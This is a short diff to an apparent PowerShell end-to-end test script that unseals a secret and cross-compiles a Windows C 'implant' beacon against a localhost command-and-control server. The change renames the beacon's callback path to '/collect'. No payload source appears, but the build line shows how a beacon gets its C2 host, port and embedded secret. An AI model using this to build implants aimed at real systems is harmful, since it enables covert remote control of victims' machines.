@@ -23,7 +23,7 @@ Write-Host "secret id=$id"
 Push-Location "C:\Users\18354\AppData\Local\Temp\opencode\unseal"
 try { $b64 = (& go run . $master $enc 2>$null) | Select-Object -First 1 } finally { Pop-Location }
 Write-Host "secret unsealed len=$($b64.Length)"
-$bat = '@echo off' + "`r`n" + 'x86_64-w64-mingw32-gcc -O2 -Wall -o cbeacon-e2e.exe beacon.c crypto_cng.c curve25519.c -lwinhttp -lbcrypt -lpsapi -liphlpapi -DC2_HOST=\"127.0.0.1\" -DC2_PORT=8001 -DBEACON_PATH=\"/api/v1/beacon\" -DSECRET_ID=\"' + $id + '\" -DSECRET_B64=\"' + $b64 + '\" -DINTERVAL=3 -DE2E_DEBUG'
+$bat = '@echo off' + "`r`n" + 'x86_64-w64-mingw32-gcc -O2 -Wall -o cbeacon-e2e.exe beacon.c crypto_cng.c curve25519.c -lwinhttp -lbcrypt -lpsapi -liphlpapi -DC2_HOST=\"127.0.0.1\" -DC2_PORT=8001 -DBEACON_PATH=\"/collect\" -DSECRET_ID=\"' + $id + '\" -DSECRET_B64=\"' + $b64 + '\" -DINTERVAL=3 -DE2E_DEBUG'
 Set-Content -Path "$repo\proto\c-implant\build-e2e.bat" -Value $bat
 Push-Location "$repo\proto\c-implant"
 try {
